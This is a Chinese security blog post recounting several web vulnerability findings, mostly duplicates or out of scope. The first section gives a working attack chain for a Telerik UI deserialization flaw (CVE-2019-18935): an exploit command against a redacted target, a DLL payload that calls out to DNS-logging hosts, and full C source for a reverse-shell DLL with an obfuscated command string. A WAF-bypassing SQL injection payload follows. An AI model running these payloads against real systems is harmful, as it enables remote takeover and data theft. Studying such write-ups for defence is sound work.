---
title: 记一次web漏洞挖掘随笔 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17145117.html
source: 博客园 - 渗透测试中心
date: 2023-02-23
fetch_date: 2025-10-04T07:51:19.612297
---

# 记一次web漏洞挖掘随笔 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [记一次web漏洞挖掘随笔](https://www.cnblogs.com/backlion/p/17145117.html "发布于 2023-02-22 17:06")

最近挖了一些漏洞。虽然重复了，但是有参考价值。这边给大家分享下。

##

漏洞重复还是很难受的，转念一想，人生从不是事事如人意的，漏洞重复忽略，不代表失败。先来后到很重要，出场顺序很重要。

　　**1.某站rce 忽略理由:不在范围内 作者神父&me 感谢神父带我**

　　测试域名:https://\*\*\*.\*\*\*:8089/

　　同时存在CVE-2017-11357 CVE-2019-18935 CVE-2017-9248漏洞

　　漏洞利用exp下载地址:

　　https://github.com/noperator/CVE-2019-18935
　　https://github.com/noperator/CVE-2019-18935.git

延迟11s:sleep 11s:

　　测试代码: test.c

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170536598-303821328.png)

```
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        //Sleep(10000);  // Time interval in milliseconds.
        Sleep(11000);
    return TRUE;
}

test.c编译成amd642.dll文件
```

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170537187-1442368253.png)

运行:
python CVE-2019-18935.py -v 2017.1.228 -p payloads\amd642.dll -u https://\*\*\*.\*\*\*\*:8089/Telerik.Web.UI.WebResource.axd?type=rau

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170537951-1945224934.png)

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170538699-936564907.png)

 第一步验证成功，成功延迟11s左右，原始请求2s

　　测试命令执行:

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170539251-550004527.png)

```
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        system("cmd.exe /c nslookup rsmwe.dnslog.cn");
system("cmd.exe /c nslookup 2pstpep28u6vl9qrw0lhjwsr9if83x.burpcollaborator.net");
    return TRUE;
}
```

test.c编译成amd642.dll文件

```

```

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170539759-380243300.png)

再次运行查看dnslog:

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170540530-1874622091.png)

直接反弹shell，通用exp:

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170541204-1570066341.png)

```
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32")

#define HOST "{vps ip}"
#define PORT {port}

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

// Adapted from https://github.com/infoskirmish/Window-Tools/blob/master/Simple%20Reverse%20Shell/shell.c
void ReverseShell()
{
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host = gethostbyname(HOST);
    strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);
    hax.sin_addr.s_addr = inet_addr(aip_addr);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    if (WSAGetLastError() == 0) {

        memset(&ini_processo, 0, sizeof(ini_processo));

        ini_processo.cb = sizeof(ini_processo);
        ini_processo.dwFlags = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

        char *myArray[4] = { "cm", "d.e", "x", "e" };
        char command[8] = "";
        snprintf(command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);
        CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    }
}

DWORD WINAPI MainThread(LPVOID lpParam)
{
    ReverseShell();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    HANDLE hThread;

    if (fdwReason == DLL_PROCESS_ATTACH)
        hThread = CreateThread(0, 0, MainThread, 0, 0, 0);

    return TRUE;
}
```

![复制代码](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170541716-2131800060.png)

权限不低，是域用户:

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170543619-1183128780.png)

**2.sql注入:**

**背景介绍:朋友发来一个注入，这个注入还挺棘手的，有xx云的waf，并且后端过滤了逗号，单双引号以及常规函数等。**

　　我的思路很简单，十六进制。regexp函数即可，我觉得应该还有别的思路

```
(case+when+current_user+regexp+0x*+then+1+else+2*1e308+end)
```

这样就把数据库user搞出来了。

　　这里我想说下case when这个语句，case when语句比我们想象的要灵活的多，这里做下笔记说下:

　　最常见的:

　　![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170544862-1185292363.png)

　　说点不常见的，我写两个demo，可以一直套娃下去:

```
case 1=1 when 2=2 then 1=1 else 1/0 end
```

　　![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170545586-92813638.png)

![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170546271-184550155.png)

 　3.**url跳转+身份认证token泄漏:**

我昨天晚上挖的，忽略理由是重复。有时候对某些厂商还挺无语的，漏洞在那边，不修复。让我有种错觉，发现漏洞，有种踩到蜜罐的错觉。

　　资产范围是:vc-\*.xxx.com

　　其实遇到这种范围，我还挺开心的，因为我可以Fuzz下，简单Fuzz了下，发现不少资产。

　　挨个打开看，访问:vc-ss.xxx.com，访问站点，直接跳转要求登录。

　　我不是神仙，我也没账号，我看着js，没发现可访问的路径信息。

　　开始fuzz，知道是php就很好办了。使用ffuf跑php/api字典，跑到了一个接口开发文档/api/\*\*\*.html

　　接口开发文档设计本意是好的，但是大多数的接口开发文档上的截图信息/接口信息都可能有被二次漏洞利用风险。虽然截图信息都是明文，但是很不幸的是测试了下，发现几乎所有的接口，直接访问都是401，需要身份认证。些许无奈了，想放弃的时候，总是告诉自己，坚持看完看仔细。继续盯着接口文档一直翻来翻去，发现了一个身份token泄漏和其他一些安全漏洞。

　　整理漏洞提交了，早上就收到了重复的消息:

　　![](https://img2023.cnblogs.com/blog/1049983/202302/1049983-20230222170546905-741073056.png)

原文链接： <https://www.cnblogs.com/piaomiaohongchen/p/17130283.html>

posted @
2023-02-22 17:06
[渗透测试中心](https://www.cnblogs.com/backlion)
阅读(1060)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025